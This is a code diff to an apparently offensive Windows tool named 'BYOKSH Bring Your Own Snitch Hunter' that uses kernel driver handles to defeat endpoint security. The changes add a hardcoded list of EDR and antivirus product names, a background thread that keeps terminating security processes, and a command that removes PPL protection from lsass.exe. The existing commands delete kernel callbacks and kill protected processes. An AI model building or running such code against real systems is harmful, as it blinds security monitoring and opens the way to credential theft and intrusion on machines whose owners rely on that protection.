@@ -6,6 +6,9 @@
 EZPDB pdb;
 ULONG_PTR ntoskrnlBase;
 
+int stop_term = 0;
+HANDLE termDevice;
+
 const char* monitoredDrivers[] = {
 	"EX64.sys", "Eng64.sys", "teefer2.sys", "teefer3.sys", "srtsp64.sys",
 	"srtspx64.sys", "srtspl64.sys", "Ironx64.sys", "fekern.sys", "cbk7.sys",
@@ -30,6 +33,43 @@ const char* monitoredDrivers[] = {
 	"cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
 	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
 };
+
+
+const char* g_edrlist[] = {
+	"activeconsole", "anti malware",    "anti-malware",
+	"antimalware",   "anti virus",      "anti-virus",
+	"antivirus",     "appsense",        "authtap",
+	"avast",         "avecto",          "canary",
+	"carbonblack",   "carbon black",    "cb.exe",
+	"ciscoamp",      "cisco amp",       "countercept",
+	"countertack",   "cramtray",        "crssvc",
+	"crowdstrike",   "csagent",         "csfalcon",
+	"csshell",       "cybereason",      "cyclorama",
+	"cylance",       "cyoptics",        "cyupdate",
+	"cyvera",        "cyserver",        "cytray",
+	"darktrace",     "defendpoint",     "defender",
+	"eectrl",        "elastic",         "endgame",
+	"f-secure",      "forcepoint",      "fireeye",
+	"groundling",    "GRRservic",       "inspector",
+	"ivanti",        "kaspersky",       "lacuna",
+	"logrhythm",     "malware",         "mandiant",
+	"mcafee",        "morphisec",       "msascuil",
+	"msmpeng",       "nissrv",          "omni",
+	"omniagent",     "osquery",         "palo alto networks",
+	"pgeposervice",  "pgsystemtray",    "privilegeguard",
+	"procwall",      "protectorservic", "qradar",
+	"redcloak",      "secureworks",     "securityhealthservice",
+	"semlaunchsv",   "sentinel",        "sepliveupdat",
+	"sisidsservice", "sisipsservice",   "sisipsutil",
+	"smc.exe",       "smcgui",          "snac64",
+	"sophos",        "splunk",          "srtsp",
+	"symantec",      "symcorpu",        "symefasi",
+	"sysinternal",   "sysmon",          "tanium",
+	"tda.exe",       "tdawork",         "tpython",
+	"vectra",        "wincollect",      "windowssensor",
+	"wireshark",     "threat",          "xagt.exe",
+	"xagtnotif.exe" ,"mssense" };
+
 
 
 int main() {
@@ -65,13 +105,26 @@ int main() {
 	
 	printf("Kernel base: %p\n", ntoskrnlBase);
 
-	printf("Downloading pdb files\n");
-
-    pdb = loadKernelOffsets();
-
-
-
 	CHAR input[256];
+
+	//printf("Downloading pdb files\n");
+	printf("Do You want to download pdb or use local pdb file?\n");
+	printf("[1] Download\n[2] Local file\n");
+	printf("> ");
+
+	fgets(input, 256, stdin);
+	if (strncmp(input, "1", 1) == 0) {
+		pdb = loadKernelOffsets();
+	}
+	else {
+		std::string pdbPath;
+		printf("Specify the path: ");
+		std::cin >> pdbPath;
+		pdb = loadKernelOffsetsWithPath(pdbPath);
+	}
+
+
+
 
 	printf("WELCOME TO BYOKSH Bring Your Own Snitch Hunter. type help to see options\n\n");
 
@@ -81,7 +134,15 @@ int main() {
 		//if (strncmp(input, "elproccallback", 14) == 0) {
 		//	DeleteProcCallback(hDeviceRW);
 		//}
-		if (strncmp(input, "terminate", 9) == 0) {
+		if (strncmp(input, "terminatem", 10) == 0) {
+			stop_term = 0;
+			termDevice = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, (LPVOID)hDeviceTerm, 0, NULL);
+			if (termDevice == NULL) {
+				fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
+			}
+
+		}
+		else if (strncmp(input, "terminate", 9) == 0) {
 			DWORD pid = atoi(input + 10);
 			if (pid == 0) {
 				printf("Invalid PID.\n");
@@ -89,7 +150,9 @@ int main() {
 			}
 			terminateProcess(hDeviceTerm, pid);
 		}
-
+		else if (strncmp(input, "stopterm", 8) == 0) {
+			stop_term = 1;
+		}
 		else if (strncmp(input, "listproccallback", 16) == 0) {
 			ListProcCallback(hDeviceRW);
 		}
@@ -121,7 +184,10 @@ int main() {
 		else if (strncmp(input, "elobjcallback", 13) == 0) {
 			DeleteObjCallback(hDeviceRW);
 		}
-
+		else if (strncmp(input, "bypassppllsass", 14) == 0) {
+			DWORD64 pid = FindProcessId("lsass.exe");
+			BypassPpl(hDeviceRW, pid);
+		}
 
 		else if (strncmp(input, "bypassppl", 9) == 0) {
 			DWORD pid = atoi(input + 10);
@@ -129,10 +195,6 @@ int main() {
 				printf("Invalid PID.\n");
 				continue;
 			}
-			BypassPpl(hDeviceRW, pid);
-		}
-		else if (strncmp(input, "bypassppllsass", 14) == 0) {
-			DWORD64 pid = FindProcessId("lsass.exe");
 			BypassPpl(hDeviceRW, pid);
 		}
 
@@ -162,7 +224,10 @@ int main() {
 		else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
 
+			printf(" - terminatem				- start terminator thread\n");
+			printf(" - stopterm					- stop the terminator thread\n");
 			printf(" - terminate <PID>			- Terminate process (even PPL) by PID\n");
+
 
 			printf(" - listproccallback			- List process notify routines\n");
 			printf(" - listthreadcallback		- List thread notify routines\n");
